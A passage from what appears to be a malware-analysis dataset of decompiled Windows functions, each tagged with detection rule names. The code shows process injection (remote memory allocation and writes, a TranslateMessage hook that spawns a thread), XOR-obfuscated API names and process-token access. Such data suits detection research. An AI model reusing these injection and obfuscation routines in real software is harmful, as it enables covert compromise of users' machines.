= 0xc5;\n                            arg_10h_02 = &fcn.004026f0::var_1b4h;\n                            iVar5 = var_8h;\n                            iVar6 = fcn.004040c0(*hProcess, var_8h, arg_10h_02, 0xc5);\n                            if (iVar6 != 0) {\n                                arg_10h_01 = &fcn.004026f0::var_280h;\n                                arg_ch_00 = var_8h + 0xc5;\n                                iVar6 = var_20h;\n                                iVar7 = fcn.004040c0(*hProcess, arg_ch_00, arg_10h_01, var_20h);\n                                if (iVar7 != 0) {\n                                    noname_17 = 7;\n                                    arg_10h_00 = &fcn.004026f0::var_4ch;\n                                    iVar7 = var_8h + 0xc5 + var_20h;\n                                    hProcess_00 = *hProcess;\n                                    iVar8 = fcn.004040c0(hProcess_00, iVar7, arg_10h_00, 7);\n                                    if (iVar8 != 0) {\n                                        var_1f4h = 0;\n                                        var_3eh = var_8h >> 0x1f;\n                                        var_42h = var_8h;\n                                        var_1e8h = 0xc;\n                                        var_1e4h = 0;\n                                        _var_1dch = 0;\n                                        _var_1f0h = _var_38h;\n                                        var_1cch = fcn.0041e1c0(var_1d4h, var_1d0h, 5, 0, *hProcess, *hProcess >> 0x1f, \n                                                                &fcn.004026f0::var_1f0h, &fcn.004026f0::var_1f0h >> 0x1f\n                                                                , &fcn.004026f0::var_1e8h, \n                                                                &fcn.004026f0::var_1e8h >> 0x1f, 0x40, 0, \n                                                                &fcn.004026f0::var_1dch, &fcn.004026f0::var_1dch >> 0x1f\n                                                                , hProcess_00, iVar7, arg_10h_00, noname_17, uVar1, \n                                                                arg_ch_00, arg_10h_01, iVar6, iVar3, iVar5, arg_10h_02, \n                                                                noname_25, uVar2, iVar4, arg_10h_03, noname_29, \n                                                                hProcess_00, arg_14h_00, arg_18h_00);\n                                        if ((-1 < var_1cch) &&\n                                           (iVar8 = fcn.0041c800(*hProcess, var_38h, var_34h, &stack0xffffffb8, 0xc, \n                                                                 &fcn.004026f0::var_1f4h),  iVar8 != 0)) {\n                                            var_1cch = fcn.0041e1c0(var_1d4h, var_1d0h, 5, 0, *hProcess, \n                                                                    *hProcess >> 0x1f, &fcn.004026f0::var_1f0h, \n                                                                    &fcn.004026f0::var_1f0h >> 0x1f, \n                                                                    &fcn.004026f0::var_1e8h, \n                                                                    &fcn.004026f0::var_1e8h >> 0x1f, var_1dch, var_1d8h\n                                                                    , &fcn.004026f0::var_1dch, \n                                                                    &fcn.004026f0::var_1dch >> 0x1f, hProcess_00, iVar7\n                                                                    , arg_10h_00, noname_17, uVar1, arg_ch_00, \n                                                                    arg_10h_01, iVar6, iVar3, iVar5, arg_10h_02, \n                                                                    noname_25, uVar2, iVar4, arg_10h_03, noname_29, \n                                                                    hProcess_00, arg_14h_00, arg_18h_00);\n                                            *arg_18h = var_8h;\n                                            var_1c8h = 1;\n                                        }\n                                        (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                                  (*hProcess, var_8h, 0x200, 0x20, &fcn.004026f0::lpflOldProtect);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    else {\n        var_b4h._0_1_ = 0x50;\n        var_b4h._1_1_ = 0x53;\n        var_b4h._2_1_ = 0x51;\n        var_b4h._3_1_ = 0xb8;\n        var_b0h = 0x55555555;\n        var_ach = 0x83;\n        var_abh = 0x38;\n        var_aah = 1;\n        var_a9h = 0x74;\n        var_a8h = 0x25;\n        var_a7h = 199;\n        var_a6h = 0;\n        var_a5h = 1;\n        var_a4h = 0;\n        var_a3h = 0;\n        var_a2h = 0;\n        var_a1h = 0x31;\n        var_a0h = 0xc0;\n        var_9fh = 0x50;\n        var_9eh = 0x50;\n        var_9dh = 0x68;\n        var_9ch = 0x11223344;\n        var_98h = 0x68;\n        var_97h = 0x55667788;\n        var_93h = 0x50;\n        var_92h = 0x50;\n        var_91h = 0xbb;\n        var_90h = 0x11111111;\n        var_8ch = 0xff;\n        var_8bh = 0xd3;\n        var_8ah = 0x50;\n        var_89h = 0xb9;\n        var_88h = 0x22222222;\n        var_84h = 0xff;\n        var_83h = 0xd1;\n        var_82h = 0x59;\n        var_81h = 0x5b;\n        var_80h = 0x58;\n        var_7fh = 0x55;\n        var_7eh = 0x89;\n        var_7dh = 0xe5;\n        var_ch = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*hProcess, 0, 0x38, 0x3000, 0x20);\n        var_24h = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*hProcess, 0, 5, 0x3000, 0x20);\n        if (var_24h != 0) {\n            fcn.00404150(&fcn.004026f0::var_54h, arg_ch, var_24h);\n            iVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                              (*hProcess, var_24h, 5, 0x40, &fcn.004026f0::lpflOldProtect);\n            if (iVar3 != 0) {\n                iVar3 = fcn.004040c0(*hProcess, var_24h, &fcn.004026f0::var_54h, 5);\n                if (iVar3 != 0) {\n                    arg_ch = var_24h;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*hProcess, var_24h, 5, lpflOldProtect, &fcn.004026f0::lpflOldProtect);\n            }\n        }\n        if (var_ch != 0) {\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*hProcess, var_ch, 0x3d, 0x40, &fcn.004026f0::lpflOldProtect);\n            fcn.00404150(&fcn.004026f0::var_54h, _sym.imp.USER32.dll_TranslateMessage + 5, var_ch + 0x38);\n            var_b0h = var_ch + 0x3d;\n            var_9ch = arg_10h;\n            var_97h = arg_ch;\n            var_90h = _sym.imp.KERNEL32.dll_CreateThread;\n            var_88h = _sym.imp.KERNEL32.dll_CloseHandle;\n            iVar3 = fcn.004040c0(*hProcess, var_ch, &fcn.004026f0::var_b4h, 0x38);\n            if ((iVar3 != 0) && (iVar3 = fcn.004040c0(*hProcess, var_ch + 0x38, &fcn.004026f0::var_54h, 5),  iVar3 != 0)\n               ) {\n                fcn.00404150(&fcn.004026f0::var_54h, var_ch, _sym.imp.USER32.dll_TranslateMessage);\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*hProcess, _sym.imp.USER32.dll_TranslateMessage, 0x400, 0x40, &fcn.004026f0::lpflOldProtect);\n                iVar3 = fcn.004040c0(*hProcess, _sym.imp.USER32.dll_TranslateMessage, &fcn.004026f0::var_54h, 5);\n                if (iVar3 != 0) {\n                    *arg_18h = var_ch;\n                    var_1c8h = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*hProcess, _sym.imp.USER32.dll_TranslateMessage, 0x400, lpflOldProtect, \n                           &fcn.004026f0::lpflOldProtect);\n            }\n        }\n    }\n    return var_1c8h;\n}\n",
        "token_count": 9826
    },
    "004038c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004038c0(uint *arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t *arg_14h, code *arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    code *pcVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    code *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t hObject;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    var_18h = 0;\n    var_14h = 0;\n    hObject = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_34h = fcn.0041f240;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    if (((arg_10h & 0x10) == 0) && ((*0x436b50 & 1) != 0)) {\n        var_34h = 0x428008;\n        var_1ch = arg_ch[2];\n    }\n    else {\n        var_1ch = *arg_ch;\n    }\n    if (var_1ch == 0) {\n        var_4h = 2;\n    }\n    else {\n        var_24h = var_1ch + *(var_1ch + 0x3c);\n        if (*(var_24h + 4) == -0x799c) {\n            var_30h = *(var_24h + 0x50);\n        }\n        else {\n            var_30h = *(var_24h + 0x50);\n        }\n        var_ch = var_30h + 0xfffU & 0xfffff000;\n        var_4h = fcn.00410e60(var_ch + 0xc50 + arg_ch[4] + arg_ch[5], &var_18h, &hObject);\n        if (((var_4h == 0) && (var_4h = fcn.00411620(hObject, *arg_8h, &var_14h),  var_4h == 0)) &&\n           (var_4h = fcn.004112f0(var_18h, var_1ch, var_14h),  var_4h == 0)) {\n            puVar2 = *arg_ch;\n            puVar4 = var_18h + 0xc50 + var_ch;\n            for (iVar1 = arg_ch[4]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar4 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puVar2 = arg_ch[2];\n            puVar4 = var_18h + var_ch + 0xc50 + arg_ch[4];\n            for (iVar1 = arg_ch[5]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar4 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            var_8h = var_18h + var_ch;\n            *(var_8h + 0x30) = var_14h;\n            *(var_8h + 0x34) = var_14h >> 0x1f;\n            piVar3 = arg_ch;\n            puVar2 = var_8h + 0x18;\n            for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar2 = *piVar3;\n                piVar3 = piVar3 + 1;\n                puVar2 = puVar2 + 1;\n            }\n            iVar1 = var_14h + 0xc50 + var_ch;\n            *(var_8h + 0x18) = iVar1;\n            *(var_8h + 0x1c) = iVar1 >> 0x1f;\n            iVar1 = var_14h + var_ch + 0xc50 + arg_ch[4];\n            *(var_8h + 0x20) = iVar1;\n            *(var_8h + 0x24) = iVar1 >> 0x1f;\n            *(var_8h + 0x28) = arg_ch[4];\n            *(var_8h + 0x2c) = arg_ch[5];\n            if (((arg_10h & 0x10) == 0) && ((*0x436b50 & 1) != 0)) {\n                var_4h = fcn.00402290(var_8h, *arg_8h);\n            }\n            else {\n                var_4h = fcn.00401e10(var_8h);\n            }\n            if (var_4h == 0) {\n                pcVar5 = var_8h + 0x40;\n                for (iVar1 = 0x800; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *pcVar5 = *var_34h;\n                    var_34h = var_34h + 1;\n                    pcVar5 = pcVar5 + 1;\n                }\n                var_10h = var_14h + var_ch;\n                if (arg_18h != NULL) {\n                    var_28h = 0;\n                    iVar1 = fcn.004026f0(arg_8h, var_10h + 0x40, var_10h, arg_10h, &var_28h);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.004010f0();\n                        if (iVar1 == 0) {\n                            var_4h = (*arg_18h)(arg_8h, var_10h + 0x40, var_10h, arg_10h, arg_1ch);\n                        }\n                        else {\n                            var_28h = var_10h + 0x40;\n                            fcn.00401190(arg_8h[2], var_28h, var_10h, *arg_8h, arg_10h);\n                        }\n                    }\n                    else {\n                        var_4h = 0;\n                    }\n                }\n                if (arg_14h != NULL) {\n                    *arg_14h = var_14h;\n                }\n            }\n        }\n    }\n    if (var_18h != 0) {\n        fcn.00411830(0xffffffff, var_18h);\n    }\n    if (hObject != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return var_4h;\n}\n",
        "token_count": 1616
    },
    "00403c10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403c10(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint var_b0h;\n    uint in_stack_ffffff50;\n    uint var_a8h;\n    uint in_stack_ffffff58;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    code *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uint8_t var_64h [4];\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uint8_t var_44h [4];\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    if (arg_8h[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h[1]);\n        arg_8h[1] = 0;\n    }\n    var_18h = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x436b50 & 1) != 0)) {\n        if ((*0x437f98 | *0x437f9c) == 0) {\n            var_44h[0] = 0x27;\n            var_44h[1] = 0x1f;\n            var_44h[2] = 5;\n            var_44h[3] = 1;\n            var_40h = 0x3d;\n            var_3fh = 0x67;\n            var_3eh = 0xf;\n            var_3dh = 0xd;\n            var_3ch = 1;\n            var_3bh = 0x51;\n            var_20h._0_1_ = 0x49;\n            var_20h._1_1_ = 0x6b;\n            var_20h._2_1_ = 0x61;\n            var_20h._3_1_ = 0x6d;\n            var_1ch = 0x51;\n            fcn.004012a0(10);\n            for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n                fcn.00401280(var_4h, var_44h[var_4h] ^ *(&var_20h + var_4h % 5));\n            }\n            var_64h[0] = 99;\n            var_64h[1] = 0x13;\n            var_64h[2] = 0x1b;\n            var_64h[3] = 0x75;\n            var_60h = 0x37;\n            var_5fh = 0x54;\n            var_5eh = 6;\n            var_5dh = 3;\n            var_5ch = 0x53;\n            var_5bh = 0x10;\n            var_5ah = 0x42;\n            var_59h = 2;\n            var_58h = 5;\n            var_57h = 0x62;\n            var_56h = 0x2d;\n            var_55h = 0x43;\n            var_54h = 2;\n            var_53h = 0x16;\n            var_52h = 0x52;\n            var_51h = 0x45;\n            var_28h._0_1_ = 0x31;\n            var_28h._1_1_ = 0x67;\n            var_28h._2_1_ = 0x77;\n            var_28h._3_1_ = 0x36;\n            var_24h = 0x45;\n            unaff_ESI = 0x14;\n            fcn.004012a0(0x14);\n            for (var_8h = 0; var_8h < 0x14; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, var_64h[var_8h] ^ *(&var_28h + var_8h % 5));\n            }\n            var_a0h = fcn.0041d4d0();\n            arg_10h_00 = fcn.00401270();\n            arg_ch_00 = fcn.00401270();\n            *0x437f98 = fcn.0041daa0(0xffffffff, arg_ch_00, arg_10h_00);\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        *0x437f9c = *0x437f98 >> 0x20;\n        if (*0x437f98 != 0) {\n            iVar2 = fcn.0041e1c0(*0x437f98, *0x437f9c, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \n                                 arg_ch, arg_ch >> 0x1f, arg_10h, arg_10h >> 0x1f, arg_8h + 1, arg_8h + 1 >> 0x1f, \n                                 &var_a8h, &var_a8h >> 0x1f, unaff_ESI, var_b0h, in_stack_ffffff50, var_a8h, \n                                 in_stack_ffffff58, var_a0h, uVar1, var_98h, var_94h);\n            if (-1 < iVar2) {\n                var_18h = 0;\n            }\n        }\n    }\n    else {\n        var_14h = 0;\n        var_50h._0_1_ = 0x27;\n        var_50h._1_1_ = 0x1f;\n        var_50h._2_1_ = 5;\n        var_50h._3_1_ = 1;\n        var_4ch = 0x3d;\n        var_4bh = 0x67;\n        var_4ah = 0xf;\n        var_49h = 0xd;\n        var_48h = 1;\n        var_47h = 0x51;\n        var_30h._0_1_ = 0x49;\n        var_30h._1_1_ = 0x6b;\n        var_30h._2_1_ = 0x61;\n        var_30h._3_1_ = 0x6d;\n        var_2ch = 0x51;\n        fcn.004012a0(10);\n        for (var_ch = 0; var_ch < 10; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, *(&var_50h + var_ch) ^ *(&var_30h + var_ch % 5));\n        }\n        var_78h._0_1_ = 99;\n        var_78h._1_1_ = 0x13;\n        var_78h._2_1_ = 0x1b;\n        var_78h._3_1_ = 0x75;\n        var_74h = 0x37;\n        var_73h = 0x54;\n        var_72h = 6;\n        var_71h = 3;\n        var_70h = 0x53;\n        var_6fh = 0x10;\n        var_6eh = 0x42;\n        var_6dh = 2;\n        var_6ch = 5;\n        var_6bh = 0x62;\n        var_6ah = 0x2d;\n        var_69h = 0x43;\n        var_68h = 2;\n        var_67h = 0x16;\n        var_66h = 0x52;\n        var_65h = 0x45;\n        var_38h._0_1_ = 0x31;\n        var_38h._1_1_ = 0x67;\n        var_38h._2_1_ = 0x77;\n        var_38h._3_1_ = 0x36;\n        var_34h = 0x45;\n        fcn.004012a0(0x14);\n        for (var_10h = 0; var_10h < 0x14; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&var_78h + var_10h) ^ *(&var_38h + var_10h % 5));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        var_8ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        if (var_8ch != NULL) {\n            iVar2 = (*var_8ch)(*arg_8h, 0, 0, 0, 0, 0, arg_ch, arg_10h, &var_14h, &var_b0h);\n            arg_8h[1] = var_14h;\n            if (iVar2 < 0) {\n                var_18h = fcn.00411130(iVar2);\n            }\n            else {\n                var_90h = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(var_14h, 30000);\n                if (var_90h == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(var_14h, &var_90h);\n                }\n                var_18h = 0;\n            }\n        }\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    *0x437f9c = *0x437f98 >> 0x20;\n    return var_18h;\n}\n",
        "token_count": 2881
    },
    "00404650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404650(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hLibModule;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    hLibModule = 0;\n    var_18h = 0;\n    if (*0x437fa0 == NULL) {\n        var_38h._0_1_ = 0xd;\n        var_38h._1_1_ = 0x51;\n        var_38h._2_1_ = 0x36;\n        var_38h._3_1_ = 0x5a;\n        var_34h = 0x3f;\n        var_33h = 0;\n        var_32h = 0x55;\n        var_31h = 6;\n        var_30h = 0x6a;\n        var_2fh = 0x50;\n        var_2eh = 0x36;\n        var_2dh = 0;\n        var_2ch = 0x66;\n        var_20h._0_1_ = 0x66;\n        var_20h._1_1_ = 0x34;\n        var_20h._2_1_ = 0x44;\n        var_20h._3_1_ = 0x34;\n        var_1ch = 0x5a;\n        var_1bh = 0x6c;\n        fcn.004012a0(0xd);\n        for (var_4h = 0; var_4h < 0xd; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_38h + var_4h) ^ *(&var_20h + var_4h % 6));\n        }\n        uVar1 = fcn.00401270();\n        hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n        if (hLibModule != 0) {\n            var_50h._0_1_ = 0x34;\n            var_50h._1_1_ = 0x1c;\n            var_50h._2_1_ = 0x5a;\n            var_50h._3_1_ = 0;\n            var_4ch = 0xb;\n            var_4bh = 0x45;\n            var_4ah = 0x17;\n            var_49h = 0x27;\n            var_48h = 0x51;\n            var_47h = 0x37;\n            var_46h = 1;\n            var_45h = 0x65;\n            var_44h = 1;\n            var_43h = 0x1d;\n            var_42h = 0x46;\n            var_41h = 10;\n            var_40h = 1;\n            var_3fh = 0x58;\n            var_3eh = 0x2d;\n            var_3dh = 10;\n            var_3ch = 0x35;\n            var_28h._0_1_ = 100;\n            var_28h._1_1_ = 0x6e;\n            var_28h._2_1_ = 0x35;\n            var_28h._3_1_ = 99;\n            var_24h = 0x6e;\n            var_23h = 0x36;\n            fcn.004012a0(0x15);\n            for (var_8h = 0; var_8h < 0x15; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_50h + var_8h) ^ *(&var_28h + var_8h % 6));\n            }\n            uVar1 = fcn.00401270();\n            *0x437fa0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, uVar1);\n            fcn.004012d0();\n        }\n        fcn.004012d0();\n    }\n    if ((*0x437fa0 != NULL) && (iVar2 = (**0x437fa0)(arg_8h, &var_18h),  iVar2 == 0)) {\n        var_18h = 0xffffffff;\n    }\n    if (hLibModule != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    }\n    return var_18h;\n}\n",
        "token_count": 1302
    },
    "00404860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404860(uint arg_8h, uint ARG_0)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uint var_80h;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uint8_t var_68h [4];\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uint var_58h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    int32_t ProcessHandle;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uchar *var_1ch;\n    uchar *var_18h;\n    int32_t TokenHandle;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_c8h = 0x104;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_c4h = 0x104;\n    var_c0h = 0;\n    TokenInformationLength = 0;\n    ProcessHandle = 0;\n    var_ach = 0;\n    if ((var_1ch != NULL) && (var_18h != NULL)) {\n        ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, arg_8h);\n        if (ProcessHandle != 0) {\n            puVar3 = var_1ch;\n            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_18h;\n            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_80h._0_1_ = 0x6f;\n            var_80h._1_1_ = 0xe;\n            var_80h._2_1_ = 0x1e;\n            var_80h._3_1_ = 0x26;\n            var_7ch = 0xd;\n            var_7bh = 0x1a;\n            var_7ah = 0x4c;\n            var_79h = 0x30;\n            var_78h = 0x21;\n            var_77h = 0x35;\n            var_76h = 7;\n            var_75h = 0x1a;\n            var_74h = 0x58;\n            var_73h = 0x18;\n            var_72h = 0x3b;\n            var_71h = 0x3a;\n            var_70h = 7;\n            var_6fh = 6;\n            var_6eh = 0x61;\n            var_6dh = 0x16;\n            var_6ch = 0x24;\n            var_6bh = 0x36;\n            var_6ah = 6;\n            var_69h = 0x68;\n            var_38h._0_1_ = 0x35;\n            var_38h._1_1_ = 0x79;\n            var_38h._2_1_ = 0x4f;\n            var_38h._3_1_ = 0x53;\n            var_34h = 0x68;\n            var_33h = 0x68;\n            fcn.004012a0(0x18);\n            for (var_4h = 0; var_4h < 0x18; var_4h = var_4h + 1) {\n                fcn.00401280(var_4h, *(&var_80h + var_4h) ^ *(&var_38h + var_4h % 6));\n            }\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x20008, &TokenHandle);\n            if ((iVar2 != 0) || (TokenHandle == 0)) {\n                var_58h._0_1_ = 0xd;\n                var_58h._1_1_ = 0x51;\n                var_58h._2_1_ = 0x36;\n                var_58h._3_1_ = 0x5a;\n                var_54h = 0x3f;\n                var_53h = 0;\n                var_52h = 0x55;\n                var_51h = 6;\n                var_50h = 0x6a;\n                var_4fh = 0x50;\n                var_4eh = 0x36;\n                var_4dh = 0;\n                var_4ch = 0x66;\n                var_40h._0_1_ = 0x66;\n                var_40h._1_1_ = 0x34;\n                var_40h._2_1_ = 0x44;\n                var_40h._3_1_ = 0x34;\n                var_3ch = 0x5a;\n                var_3bh = 0x6c;\n                fcn.004012a0(0xd);\n                for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n                    fcn.00401280(var_8h, *(&var_58h + var_8h) ^ 